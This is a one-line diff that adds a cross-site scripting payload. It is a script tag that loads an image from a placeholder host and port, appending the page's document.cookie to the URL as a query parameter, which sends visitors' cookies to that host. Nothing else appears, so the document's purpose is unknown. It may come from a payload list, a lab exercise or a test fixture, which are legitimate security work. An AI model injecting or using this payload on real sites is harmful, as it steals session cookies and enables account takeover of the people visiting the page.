@@ -1,0 +1,1 @@
+<script>Image().src="http://target_ip:target_port/x.jpg?output="+document.cookie;</script>
